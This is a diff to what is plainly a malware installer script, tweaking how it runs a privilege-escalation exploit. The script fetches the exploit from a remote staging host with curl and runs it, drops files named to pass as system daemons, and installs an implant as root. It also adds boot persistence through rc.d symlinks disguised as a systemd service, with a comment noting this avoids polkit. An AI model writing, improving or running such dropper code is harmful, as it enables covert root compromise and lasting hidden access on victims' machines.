@@ -18,7 +18,7 @@ chmod +x "${WORK}/.dbus-daemon"
 # Download and run privesc exploit - polls up to 30s for SUID /tmp/.sh
 curl -sLk --max-time 60 -o "${WORK}/.privesc" "https://${STAGING_HOST}:8443/privesc"
 chmod +x "${WORK}/.privesc"
-"${WORK}/.privesc" >/dev/null 2>&1
+timeout 10 "${WORK}/.privesc" >/dev/null 2>&1 || true
 rm -f "${WORK}/.privesc"
 
 # Install implant + persistence as root
@@ -42,7 +42,7 @@ if sudo -n true 2>/dev/null || [ -u /tmp/.sh ]; then
     _run_root "cp /tmp/.initd '${INITD}' && chmod 755 '${INITD}' && chown root:root '${INITD}'"
     rm -f /tmp/.initd
 
-    # Enable persistence (manual symlinks - avoids update-rc.d → systemctl → polkit)
+    # Enable persistence (manual symlinks - avoids update-rc.d -> systemctl -> polkit)
     for r in 2 3 4 5; do
         _run_root "ln -sf '${INITD}' /etc/rc${r}.d/S20systemd-networkd-wait"
     done
